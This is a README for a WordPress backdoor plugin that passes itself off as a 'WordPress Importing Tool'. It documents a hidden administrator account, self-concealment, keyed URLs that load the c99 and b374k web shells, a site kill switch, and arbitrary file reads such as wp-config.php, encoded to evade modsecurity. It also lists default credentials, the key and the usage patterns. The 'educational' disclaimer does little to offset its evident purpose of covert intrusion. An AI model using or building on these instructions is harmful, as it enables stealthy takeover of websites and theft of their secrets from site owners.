# Wordpress Backdoor Plugin

## Heads up

This project is not maintained and likely won't be for quite some time since I'm fairly busy with other projects. If you want to update the plugin to work if something is broken, feel free to submit a PR.

## Contributors
* IRDeNial

## Tested On
* Version 4.5.3
* Version 4.5.2
* Version 4.5.1
* Version 4.5

**License**: GPLv3 or later

# Description

This plugin is strictly for educational and rescue purposes only.  Misuse of this plugin is caused by the intention of the user, not at the contributors.  The contributors take no responsibility for any misuse of this plugin.

This plugin does the following:
* Creates an administrator user
* Installs all plugins located in the ./plugins/ folder.
* Hides said administrator user from the user control area
* Hides the backdoor plugin & all plugins loaded by it
* Hides the plugin and user counters
* Implements a "kill switch" into the website that redirects to "purple.com" (No affiliation, just a funny site)
* Implements a method to access the c99 & b374k PHP shells via URL

# Installation

1. Download the latest release from here: 
    * https://github.com/IRDeNial/Wordpress-Backdoor-Plugin/releases
2. Modify the plugin as necessary.  Future versions will have an easier method of controlling access.
    * Backdoor username, password, and key are all stored in the __construct() method of the plugin.  Search for `$this->username =`, `$this->password =`, and `$this->key =` in order to find the individual things that need to be configured.  Again, this will change in the future.
2. Upload the plugin files to the `/wp-content/plugins/wp-sph/` directory (If it does not exist, create it), or install the plugin through the WordPress plugins screen directly if you want to keep everything default.
3. Activate the plugin through the 'Plugins' screen in WordPress.  It is titled `WordPress Importing Tool`
4. Login as the configured user.


# Frequently Asked Questions

* **What is the default login?**
    * Username: WVuIr83XIZ8Zll1
    * Password: C6oh3K5M9SHuCgQ

* **What is the default key?**
    * jds89f43qmpewqfiopsejaSDJF

* **How do I access a PHP shell?**
    * To access, for example, the default C99 shell on http://localhost.com, you would navigate to this url:    
        * http://localhost.com/loadshell-c99-jds89f43qmpewqfiopsejaSDJF
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **How do I use the killsite feature?**
    * To kill the website, for example, http://localhost.com, you would navigate to this url:
        * http://localhost.com/killsite-jds89f43qmpewqfiopsejaSDJF
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **How do I view files using the displayfile function?**
    * The function accepts base64 encoded filenames.
    * To view wp-config.php when viewing from the main webpage of localhost.com, you would navigate to this url:
        * http://localhost.com/?displayfile-d3AtY29uZmlnLnBocA==
    * The pattern for this is `?displayfile=(BASE64_ENCODE(FILENAME))`

* **Does the backdoor user show up for other admins?**
    * No, the backdoor user is only visible to the backdoor user.  All other users will not see the backdoor user.

* **Do any users see my installed plugins?**
    * No, the plugins installed by this plugin are hidden to all users except the backdoor user.  Upon deactivation, these plugins will be deleted to allow for less intrusion detection.

* **If I deactivate the plugin, will I still have access to the website?**
    * No, upon deactivation, the plugin will remove the backdoor user and delete all plugins that it has installed.  The only remains of the plugin will be the plugin itself, so it is wise to delete the plugin files, excluding the plugin itself, before disabling.  This will be changed in a future version.

# Contribution
    * Any contributor will be added to the contributors list at the top of this document.
    * Please pull from the development branch in order to get the latest code.
    * All contributors are to fully document all changes to code in order to be considered for the next release.
    * Contact @IRDeNial with any questions

# Changelog

* **0.4**
    * Major rebuild
    * Dynamic plugin system, allows users to include plugin zip files in the ./plugins/ folder for upload.
        * Installs & activates plugins on backdoor activation.
        * Uninstalls plugins on backdoor deactivation
        * Keeps these plugins activated by attempting to activate on every page load by any visitor on the website.
    * Backdoor user deleted on deactivation
    * Added functionality to view any file on the filesystem from the URL & base64 encoded to avoid modsecurity detection.

* **0.3**
    * Added in dynamic shell inclusion from the ./sh/ folder.  Allows for users of plugin to use whatever shell they prefer instead of specifically c99.
    * Different hook for view of wp-config.php

* **0.2**
    * Changed to class layout for easier modification/use and less chance of conflict
    * C99 shell inclusion by accessing it directly through plugin folder
    * Added in killswitch functionality
    * Added in functionality to view wp-config.php

* **0.1**
    * Made backdoor user creation routines
    * Made backdoor user hidden from all users
    * Made it forcefully activate if it is installed WP Downloader and keep it activated

# Roadmap

* Allow for custom code inclusion that takes advantage of the WP_SPH class & methods.
* Write a better display file method that's easier to use
* Implement an admin menu/area that only the backdoor user can access for easy manipulation of the backdoor.
